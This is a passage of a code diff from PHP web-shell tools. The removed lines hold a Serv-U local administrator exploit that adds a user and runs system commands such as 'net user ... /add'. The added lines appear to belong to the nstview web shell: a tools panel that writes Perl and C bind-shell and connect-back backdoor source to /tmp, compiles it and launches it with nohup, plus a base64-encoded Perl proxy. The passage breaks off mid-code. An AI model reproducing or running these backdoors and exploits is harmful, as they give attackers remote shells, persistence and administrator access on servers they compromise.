-                "-HideHidden=0\r\n".
-                "-AlwaysAllowLogin=0\r\n".
-                "-ChangePassword=0\r\n".
-                "-QuotaEnable=0\r\n".
-                "-MaxUsersLoginPerIP=-1\r\n".
-                "-SpeedLimitUp=0\r\n".
-                "-SpeedLimitDown=0\r\n".
-                "-MaxNrUsers=-1\r\n".
-                "-IdleTimeOut=600\r\n".
-                "-SessionTimeOut=-1\r\n".
-                "-Expire=0\r\n".
-                "-RatioUp=1\r\n".
-                "-RatioDown=1\r\n".
-                "-RatiosCredit=0\r\n".
-                "-QuotaCurrent=0\r\n".
-                "-QuotaMaximum=0\r\n".
-                "-Maintenance=None\r\n".
-                "-PasswordType=Regular\r\n".
-                "-Ratios=None\r\n".
-                " Access=c:\\|RELP\r\n";
-        $deldomain="-DELETEDOMAIN\r\n".
-                     "-IP=0.0.0.0\r\n".
-                     " PortNo=2121\r\n";
-        $sock = fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
-        fputs($sock, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
-        fputs($sock, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = "SITE MAINTENANCE\r\n";
-        fputs($sock, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = $domain;
-        fputs($sock, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = $adduser;
-        fputs($sock, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        echo "**********************************************************<br>";
-        echo "Starting Exploit ...<br>";
-        echo "**********************************************************<br>";
-        $exp = fsockopen("127.0.0.1", "2121", &$errno, &$errstr, 10);
-        $recvbuf = fgets($exp, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = "USER Will_Be\r\n";
-        fputs($exp, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($exp, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = "PASS Will_Be\r\n";
-        fputs($exp, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($exp, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
-        fputs($exp, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
-        $recvbuf = fgets($exp, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        echo "**********************************************************<br>";
-        echo "Starting Delete Domain ...<br>";
-        echo "**********************************************************<br>";
-        $sendbuf = $deldomain;
-        fputs($sock, $sendbuf, strlen($sendbuf));
-        echo "<font color=blue>Send: $sendbuf</font><br>";
-        $recvbuf = fgets($sock, 1024);
-        echo "<font color=red>Recv: $recvbuf</font><br>";
-        echo "</td></tr></table>";
-        fclose($sock);
-        fclose($exp);
-    }
-?>
-<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
-  <tr class="firstalt">
-    <td align="center">通过Serv-U 本地管理员帐号执行命令</td>
-  </tr>
-  <form action="?action=SUExp" method="POST">
-  <tr class="secondalt">
-    <td align="center">LocalPort:
-      <input name="SUPort" type="text" class="INPUT" id="SUPort" value="43958" size="7">      　
-      LocalUser:
-      <input name="SUUser" type="text" class="INPUT" id="SUUser" value="LocalAdministrator">       　LocalPass:
-      <input name="SUPass" type="text" class="INPUT" id="SUPass" value="#l@$ak#.lk;0@P">
-      <br>
-      Command　:
-      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user Will_Be heihei /add" size="50"></td>
-  </tr>
-  <tr class="secondalt">
-    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="执行">　
-      <input name="Submit" type="reset" class="INPUT" value="重置"></td>
-  </tr>  
-  </form>
-</table>
-<?php
+$handle = @opendir($dir);
+while (false!==($ff = @readdir($handle))){
+if($ff != "." && $ff != ".."){
+if(@is_dir("$dir/$ff")){
+deldir("$dir/$ff");
+}else{
+@unlink("$dir/$ff");
+}}}
+@closedir($handle);
+if(@rmdir($dir)){
+@$success = true;}
+return @$success;
 }
-?>
-<hr width="775" noshade>
-<table width="775" border="0" cellpadding="0">
-  <tr>
-    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
-    <td align="right"><?php
-	debuginfo();
-	ob_end_flush();	
-	?></td>
-  </tr>
+$dir=@$dir;
+deldir($dir);
+
+$rback=$_GET['rback'];
+@$rback=explode("/",$rback);
+$crb=count($rback);
+for($i=0; $i<$crb-1; $i++){
+        @$x.=$rback[$i]."/";
+}
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?d=".@$x."'\">";
+echo $copyr;
+exit;}
+
+
+if(@$_GET['t']=="tools"){
+        # unix
+if($os=="unix"){
+print "
+<center><br>
+<font color=red><b>P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.</b><br></font>
+<table border=1>
+<tr><td align=center><b>[Name]</td><td align=center><b>[C]</td><td align=center><b>[Port]</td><td align=center><b>[Perl]</td><td align=center><b>[Port]</td><td align=center><b>[Other options, info]</td></tr>
+<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input type=submit name=c_bd value='Start' style='background-color:green;'></td><td><input name=port size=6 value=5545></td></form><form method=post><td><input type=submit name=perl_bd value='Start' style='background-color:green;'></td><td><input name=port value=5551 size=6></td><td>none</td></form></tr>
+<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='background-color:green;'></td><td><input name=port_c size=6 value=5546></td><td><input type=submit value='Start' name=port_p disabled style='background-color:gray;'></td><td><input name=port value=5552 size=6></td><td>b.c. ip: <input name=ip value='".$_SERVER['REMOTE_ADDR']."'> nc -l -p <i>5546</i></td></form></tr>
+<tr><form method=post><td><font color=red><b>Datapipe:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port_1 size=6 value=5547></td><td><input type=submit value='Start' name=datapipe_pl style='background-color:green;'></td><td><input name=port_2 value=5553 size=6></td><td>other serv ip: <input name=ip> port: <input name=port_3 value=5051 size=6></td></form></tr>
+<tr><form method=post><td><font color=red><b>Web proxy:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5548></td></form><form method=post><td><input type=submit value='Start' name=perl_proxy style='background-color:green;'></td><td><input name=port size=6 value=5554></td></form><td>none</td></tr>
+<tr><form method=post><td><font color=red><b>Socks 4 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5549></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5555></td><td>none</td></tr>
+<tr><form method=post><td><font color=red><b>Socks 5 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5550></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5556></td><td>none</td></tr>
 </table>
 </center>
-</body>
-</html>
+<br><Br>
+";
+}#end of unix
 
-<?php
 
-/*======================================================
-函数库
-======================================================*/
+if($_POST['perl_bd']){
+$port=$_POST['port'];
+$perl_bd_scp = "
+use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
+setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));
+listen(S,50);while(1){accept(X,S);if(!(\$pid=fork)){if(!defined \$pid){exit(0);}
+open STDIN,\"<&X\";open STDOUT,\">&X\";open STDERR,\">&X\";exec(\"/bin/sh -i\");
+close X;}}";
 
-	// 登陆入口
-	function loginpage() {
+if(is_writable("/tmp")){
+$fp=fopen("/tmp/nst_perl_bd.pl","w");
+fwrite($fp,"$perl_bd_scp");
+passthru("nohup perl /tmp/nst_perl_bd.pl &");
+unlink("/tmp/nst_perl_bd.pl");
+}else{
+if(is_writable(".")){
+mkdir(".nst_bd_tmp");
+$fp=fopen(".nst_bd_tmp/nst_perl_bd.pl","w");
+fwrite($fp,"$perl_bd_scp");
+passthru("nohup perl .nst_bd_tmp/nst_perl_bd.pl &");
+unlink(".nst_bd_tmp/nst_perl_bd.pl");
+rmdir(".nst_bd_tmp");
+}
+}
+$show_ps="1";
+}#end of start perl_bd
+
+if($_POST['perl_proxy']){
+$port=$_POST['port'];
+$perl_proxy_scp = "IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4vcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtIGh0dHAgcHJveHkgc2VydmVyLiB6YXB1c2thamVtOiBwZXJsIHByb3h5LnBsCTgxODEgbHVib2ogcG9ydCB2aTZpIDEwMjQtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KI3JlcXVpcmUgInN5cy9zb2NrZXQucGgiOw0KdXNlIFNvY2tldDsNCnNyYW5kICh0aW1lfHwkJCk7DQojLS0tICBEZWZpbmUgYSBmcmllbmRseSBleGl0IGhhbmRsZXINCiRTSUd7J0tJTEwnfSA9ICRTSUd7UVVJVH0gPSAkU0lHe0lOVH0gPSAnZXhpdF9oYW5kbGVyJzsNCnN1YiBleGl0X2hhbmRsZXIgew0KICAgIHByaW50ICJcblxuIC0tLSBQcm94eSBzZXJ2ZXIgaXMgZHlpbmcgLi4uXG5cbiI7DQogICAgY2xvc2UoU09DS0VUKTsNCiAgICBleGl0Ow0KDQp9DQojLS0tICBTZXR1cCBzb2NrZXQNCg0KJHwgPSAxOw0KJHByb3h5X3BvcnQgPSBzaGlmdChAQVJHVik7DQokcHJveHlfcG9ydCA9IDgxODEgdW5sZXNzICRwcm94eV9wb3J0ID1+IC9cZCsvOw0KDQokc29ja2V0X2Zvcm1hdCA9ICdTIG4gYTQgeDgnOw0KJmxpc3Rlbl90b19wb3J0KFNPQ0tFVCwgJHByb3h5X3BvcnQpOw0KJGxvY2FsX2hvc3QgPSBgaG9zdG5hbWVgOw0KY2hvcCgkbG9jYWxfaG9zdCk7DQokbG9jYWxfaG9zdF9pcCA9IChnZXRob3N0YnluYW1lKCRsb2NhbF9ob3N0KSlbNF07DQpwcmludCAiIC0tLSBQcm94eSBzZXJ2ZXIgcnVubmluZyBvbiAkbG9jYWxfaG9zdCBwb3J0OiAkcHJveHlfcG9ydCBcblxuIjsNCiMtLS0gIExvb3AgZm9yZXZlciB0YWtpbmcgcmVxdWVzdHMgYXMgdGhleSBjb21lDQp3aGlsZSAoMSkgew0KIy0tLSAgV2FpdCBmb3IgcmVxdWVzdA0KICAgIHByaW50ICIgLS0tIFdhaXRpbmcgdG8gYmUgb2Ygc2VydmljZSAuLi5cbiI7DQogICAgKCRhZGRyID0gYWNjZXB0KENISUxELFNPQ0tFVCkpIHx8IGRpZSAiYWNjZXB0ICQhIjsNCiAgICAoJHBvcnQsJGluZXRhZGRyKSA9ICh1bnBhY2soJHNvY2tldF9mb3JtYXQsJGFkZHIpKVsxLDJdOw0KICAgIEBpbmV0YWRkciA9IHVucGFjaygnQzQnLCRpbmV0YWRkcik7DQogICAgcHJpbnQgIkNvbm5lY3Rpb24gZnJvbSAiLCBqb2luKCIuIiwgQGluZXRhZGRyKSwgIiAgcG9ydDogJHBvcnQgXG4iOw0KIy0tLSAgRm9yayBhIHN1YnByb2Nlc3MgdG8gaGFuZGxlIHJlcXVlc3QuDQojLS0tICBQYXJlbnQgcHJvY2VzIGNvbnRpbnVlcyBsaXN0ZW5pbmcuDQogICAgaWYgKGZvcmspIHsNCgl3YWl0OwkJIyBGb3Igbm93IHdlIHdhaXQgZm9yIHRoZSBjaGlsZCB0byBmaW5pc2gNCgluZXh0OwkJIyBXZSB3YWl0IHNvIHRoYXQgcHJpbnRvdXRzIGRvbid0IG1peA0KICAgIH0NCiMtLS0gIFJlYWQgZmlyc3QgbGluZSBvZiByZXF1ZXN0IGFuZCBhbmFseXplIGl0Lg0KIy0tLSAgUmV0dXJuIGFuZCBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QgbWV0aG9kLg0KICAgKCRmaXJzdCwkbWV0aG9kKSA9ICZhbmFseXplX3JlcXVlc3Q7DQojLS0tICBTZW5kIHJlcXVlc3QgdG8gcmVtb3RlIGhvc3QNCiAgICBwcmludCBVUkwgJGZpcnN0Ow0KICAgIHByaW50ICRmaXJzdDsNCiAgICB3aGlsZSAoPENISUxEPikgew0KCXByaW50ICRfOw0KCW5leHQgaWYgKC9Qcm94eS1Db25uZWN0aW9uOi8pOw0KCXByaW50IFVSTCAkXzsNCglsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvKTsNCiAgICB9DQogICAgaWYgKCRtZXRob2QgZXEgIlBPU1QiKSB7DQoJJGRhdGEgPSA8Q0hJTEQ+Ow0KCXByaW50ICRkYXRhOw0KCXByaW50IFVSTCAkZGF0YTsNCiAgICB9DQogICAgcHJpbnQgVVJMICJcbiI7DQojLS0tICBXYWl0IGZvciByZXNwb25zZSBhbmQgdHJhbnNmZXIgaXQgdG8gcmVxdWVzdG9yLg0KICAgIHByaW50ICIgLS0tIERvbmUgc2VuZGluZy4gUmVzcG9uc2U6IFxuXG4iOw0KICAgICRoZWFkZXIgPSAxOw0KICAgICR0ZXh0ID0gMDsNCiAgICB3aGlsZSAoPFVSTD4pIHsNCglwcmludCBDSElMRCAkXzsNCglpZiAoJGhlYWRlciB8fCAkdGV4dCkgewkgICAgICMgT25seSBwcmludCBoZWFkZXIgJiB0ZXh0IGxpbmVzIHRvIFNURE9VVA0KCSAgICBwcmludCAkXzsNCgkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15bXHNceDAwXSokLykgew0KCQkkaGVhZGVyID0gMDsNCgkgICAgfQ0KIwkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15Db250ZW50LXR5cGU6IHRleHQvKSB7DQojCQkkdGV4dCA9IDE7DQojCSAgICB9DQoJfQ0KICAgIH0NCiAgICBjbG9zZShVUkwpOw0KICAgIGNsb3NlKENISUxEKTsNCiAgICBleGl0OwkJCSMgRXhpdCBmcm9tIGNoaWxkIHByb2Nlc3MNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0JYW5hbHl6ZV9yZXF1ZXN0CQkJCQkJCS0tDQojLS0JCQkJCQkJCQktLQ0KIy0tCUFuYWx5emUgYSBuZXcgcmVxdWVzdC4gIEZpcnN0IHJlYWQgaW4gZmlyc3QgbGluZSBvZiByZXF1ZXN0LgktLQ0KIy0tCVJlYWQgVVJMIGZyb20gaXQsIHByb2Nlc3MgVVJMIGFuZCBvcGVuIGNvbm5lY3Rpb24uCQktLQ0KIy0tCVJldHVybiBhbiBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QJLS0NCiMtLQltZXRob2QuCQkJCQkJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBhbmFseXplX3JlcXVlc3Qgew0KIy0tLSAgUmVhZCBmaXJzdCBsaW5lIG9mIEhUVFAgcmVxdWVzdA0KICAgICRmaXJzdCA9IDxDSElMRD47DQoNCiAgICAkdXJsID0gKCRmaXJzdCA9fiBtfChodHRwOi8vXFMrKXwpWzBdOw0KICAgIHByaW50ICJSZXF1ZXN0IGZvciBVUkw6ICAkdXJsIFxuIjsNCg0KIy0tLSAgQ2hlY2sgaWYgZmlyc3QgbGluZSBpcyBvZiB0aGUgZm9ybSBHRVQgaHR0cDovL2hvc3QtbmFtZSAuLi4NCiAgICAoJG1ldGhvZCwgJHJlbW90ZV9ob3N0LCAkcmVtb3RlX3BvcnQpID0gDQoJKCRmaXJzdCA9fiBtIShHRVR8UE9TVHxIRUFEKSBodHRwOi8vKFteLzpdKyk6PyhcZCopISApOw0KIy0tLSAgSWYgbm90LCBiYWQgcmVxdWVzdC4NCiAgICANCiAgICBpZiAoISRyZW1vdGVfaG9zdCkgew0KCXByaW50ICRmaXJzdDsNCgl3aGlsZSAoPENISUxEPikgew0KCSAgICBwcmludCAkXzsNCgkgICAgbGFzdCBpZiAoJF8gPX4gL15bXHNceDAwXSokLyk7DQoJfQ0KCXByaW50ICJJbnZhbGlkIEhUVFAgcmVxdWVzdCBmcm9tICIsIGpvaW4oIi4iLCBAaW5ldGFkZHIpLCAiXG4iOw0KIwlwcmludCBDSElMRCAiQ29udGVudC10eXBlOiB0ZXh0L3BsYWluIiwiXG5cbiI7DQoJcHJpbnQgQ0hJTEQgIkkgZG9uJ3QgdW5kZXJzdGFuZCB5b3VyIHJlcXVlc3QuXG4iOw0KCWNsb3NlKENISUxEKTsNCglleGl0Ow0KICAgIH0NCiMtLS0gIElmIHJlcXVlc3RlZCBVUkwgaXMgdGhlIHByb3h5IHNlcnZlciB0aGVuIGlnbm9yZSByZXF1ZXN0DQogICAgJHJlbW90ZV9pcCA9IChnZXRob3N0YnluYW1lKCRyZW1vdGVfaG9zdCkpWzRdOw0KICAgIGlmICgoJHJlbW90ZV9pcCBlcSAkbG9jYWxfaG9zdF9pcCkgJiYgKCRyZW1vdGVfcG9ydCBlcSAkcHJveHlfcG9ydCkpIHsNCglwcmludCAkZmlyc3Q7DQoJd2hpbGUgKDxDSElMRD4pIHsNCgkgICAgcHJpbnQgJF87DQoJICAgIGxhc3QgaWYgKCRfID1+IC9eW1xzXHgwMF0qJC8pOw0KCX0NCglwcmludCAiIC0tLSBDb25uZWN0aW9uIHRvIHByb3h5IHNlcnZlciBpZ25vcmVkLlxuIjsNCiMJcHJpbnQgQ0hJTEQgIkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbiIsIlxuXG4iOw0KCXByaW50IENISUxEICJJdCdzIG5vdCBuaWNlIHRvIG1ha2UgbWUgbG9vcCBvbiBteXNlbGYhLlxuIjsNCgljbG9zZShDSElMRCk7DQoJZXhpdDsNCiAgICB9DQojLS0tICBTZXR1cCBjb25uZWN0aW9uIHRvIHRhcmdldCBob3N0IGFuZCBzZW5kIHJlcXVlc3QNCiAgICAkcmVtb3RlX3BvcnQgPSAiaHR0cCIgdW5sZXNzICgkcmVtb3RlX3BvcnQpOw0KICAgICZvcGVuX2Nvbm5lY3Rpb24oVVJMLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7DQojLS0tICBSZW1vdmUgcmVtb3RlIGhvc3RuYW1lIGZyb20gVVJMDQogICAgICAgICRmaXJzdCA9fiBzL2h0dHA6XC9cL1teXC9dKy8vOw0KICAgICgkZmlyc3QsICRtZXRob2QpOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLQlsaXN0ZW5fdG9fcG9ydChTT0NLRVQsICRwb3J0KQkJCQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgbGlzdGVucyB0byBhIHNwZWNpZmljIHBvcnQJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBsaXN0ZW5fdG9fcG9ydCB7DQogICAgbG9jYWwgKCRwb3J0KSA9ICRfWzFdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIsICRtYXhfcmVxdWVzdHMpOw0KICAgICRtYXhfcmVxdWVzdHMgPSAzOwkJIyBNYXggbnVtYmVyIG9mIG91dHN0YW5kaW5nIHJlcXVlc3RzDQogICAgJHNvY2tldF9mb3JtYXQgPSAnUyBuIGE0IHg4JzsNCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcGFja2VkX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICJcMFwwXDBcMCIpOw0KICAgIHNvY2tldCgkX1swXSwgJlBGX0lORVQsICZTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUgInNvY2tldDogJCEiOw0KICAgIGJpbmQoJF9bMF0sICRwYWNrZWRfcG9ydCkgfHwgZGllICJiaW5kOiAkISI7DQogICAgbGlzdGVuKCRfWzBdLCAkbWF4X3JlcXVlc3RzKSB8fCBkaWUgImxpc3RlbjogJCEiOw0KICAgICRjdXIgPSBzZWxlY3QoJF9bMF0pOyAgDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQogICAgfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tCW9wZW5fY29ubmVjdGlvbihTT0NLRVQsICRyZW1vdGVfaG9zdG5hbWUsICRwb3J0KQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgY29ubmVjdHMgdG8gYSBjZXJ0YWluIGhvc3QJCQktLQ0KIy0tCSRsb2NhbF9ob3N0X2lwIGlzIGFzc3VtZWQgdG8gYmUgbG9jYWwgaG9zdG5hbWUgSVAgYWRkcmVzcwktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBvcGVuX2Nvbm5lY3Rpb24gew0KICAgIGxvY2FsICgkcmVtb3RlX2hvc3RuYW1lLCAkcG9ydCkgPSBAX1sxLDJdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIpOw0KICAgIGxvY2FsICgkcmVtb3RlX2FkZHIsIEByZW1vdGVfaXAsICRyZW1vdGVfaXApOw0KICAgIGxvY2FsICgkbG9jYWxfcG9ydCwgJHJlbW90ZV9wb3J0KTsNCiAgICBpZiAoJHBvcnQgIX4gL15cZCskLykgew0KCSRwb3J0ID0gKGdldHNlcnZieW5hbWUoJHBvcnQsICJ0Y3AiKSlbMl07DQoJJHBvcnQgPSA2NjY3IHVubGVzcyAoJHBvcnQpOw0KICAgIH0NCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcmVtb3RlX2FkZHIgPSAoZ2V0aG9zdGJ5bmFtZSgkcmVtb3RlX2hvc3RuYW1lKSlbNF07DQogICAgaWYgKCEkcmVtb3RlX2FkZHIpIHsNCglkaWUgIlVua25vd24gaG9zdDogJHJlbW90ZV9ob3N0bmFtZSI7DQogICAgfQ0KDQogICAgQHJlbW90ZV9pcCA9IHVucGFjaygiQzQiLCAkcmVtb3RlX2FkZHIpOw0KICAgICRyZW1vdGVfaXAgPSBqb2luKCIuIiwgQHJlbW90ZV9pcCk7DQogICAgcHJpbnQgIkNvbm5lY3RpbmcgdG8gJHJlbW90ZV9pcCBwb3J0ICRwb3J0LlxuXG4iOw0KICAgICRzb2NrZXRfZm9ybWF0ID0gJ1MgbiBhNCB4OCc7DQogICAgJGxvY2FsX3BvcnQgID0gcGFjaygkc29ja2V0X2Zvcm1hdCwgJkFGX0lORVQsIDAsICRsb2NhbF9ob3N0X2lwKTsNCiAgICAkcmVtb3RlX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICRyZW1vdGVfYWRkcik7DQogICAgc29ja2V0KCRfWzBdLCAmQUZfSU5FVCwgJlNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAic29ja2V0OiAkISI7DQogICAgYmluZCgkX1swXSwgJGxvY2FsX3BvcnQpIHx8IGRpZSAiYmluZDogJCEiOw0KICAgIGNvbm5lY3QoJF9bMF0sICRyZW1vdGVfcG9ydCkgfHwgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAkY3VyID0gc2VsZWN0KCRfWzBdKTsgIA0KDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQp9DQoNCg==";
+
+if(is_writable("/tmp")){
+$fp=fopen("/tmp/nst_perl_proxy.pl","w");
+fwrite($fp,base64_decode($perl_proxy_scp));
+passthru("nohup perl /tmp/nst_perl_proxy.pl $port &");
+unlink("/tmp/nst_perl_proxy.pl");
+}else{
+if(is_writable(".")){
+mkdir(".nst_proxy_tmp");
+$fp=fopen(".nst_proxy_tmp/nst_perl_proxy.pl","w");
+fwrite($fp,base64_decode($perl_proxy_scp));
+passthru("nohup perl .nst_proxy_tmp/nst_perl_proxy.pl $port &");
+unlink(".nst_proxy_tmp/nst_perl_proxy.pl");
+rmdir(".nst_proxy_tmp");
+}
+}
+$show_ps="1";
+}#end of start perl_proxy
+
+if($_POST['c_bd']){
+$port=$_POST['port'];
+$c_bd_scp = "#define PORT $port
+#include <stdio.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
+struct sockaddr_in serv_addr;
+struct sockaddr_in client_addr;
+
+int main ()
+{
+    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (soc_des == -1)
+        exit(-1);
+    bzero((char *) &serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    serv_addr.sin_port = htons(PORT);
+    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+    if (soc_rc != 0)
+        exit(-1);
+    if (fork() != 0)
+        exit(0);
+    setpgrp();
+    signal(SIGHUP, SIG_IGN);
+    if (fork() != 0)
+        exit(0);
+    soc_rc = listen(soc_des, 5);
+    if (soc_rc != 0)
+        exit(0);
+    while (1) {
+        soc_len = sizeof(client_addr);
+        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
+        if (soc_cli < 0)
+            exit(0);
+        cli_pid = getpid();
+        server_pid = fork();
+        if (server_pid != 0) {
+            dup2(soc_cli,0);
+            dup2(soc_cli,1);
+            dup2(soc_cli,2);
+            execl(\"/bin/sh\",\"sh\",(char *)0);
+            close(soc_cli);
+            exit(0);
+        }
+    close(soc_cli);
+    }
+}
+
+";
+
+
+if(is_writable("/tmp")){
+$fp=fopen("/tmp/nst_c_bd.c","w");
+fwrite($fp,"$c_bd_scp");
+passthru("gcc /tmp/nst_c_bd.c -o /tmp/nst_bd");
+passthru("nohup /tmp/nst_bd &");
+unlink("/tmp/nst_c_bd.c");
+unlink("/tmp/nst_bd");
+}else{
+if(is_writable(".")){
+mkdir(".nst_bd_tmp");
+$fp=fopen(".nst_bd_tmp/nst_c_bd.c","w");
+fwrite($fp,"$c_bd_scp");
+passthru("gcc .nst_bd_tmp/nst_c_bd.c -o .nst_bd_tmp/nst_bd");
+passthru("nohup .nst_bd_tmp/nst_bd &");
+unlink(".nst_bd_tmp/nst_bd");
+unlink(".nst_bd_tmp/nst_c_bd.c");
+rmdir(".nst_bd_tmp");
+}
+}
+$show_ps="1";
+}#end of c bd
+
+
+if($_POST['bc_c']){ # nc -l -p 4500
+$port_c = $_POST['port_c'];
+$ip=$_POST['ip'];
+$bc_c_scp = "#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#include <netinet/in.h>
+#include <netdb.h>
+
+int fd, sock;
+int port = $port_c;
+struct sockaddr_in addr;
+
+char mesg[]  = \"::Connect-Back Backdoor:: CMD: \";
+char shell[] = \"/bin/sh\";
+
+int main(int argc, char *argv[]) {
+        while(argc<2) {
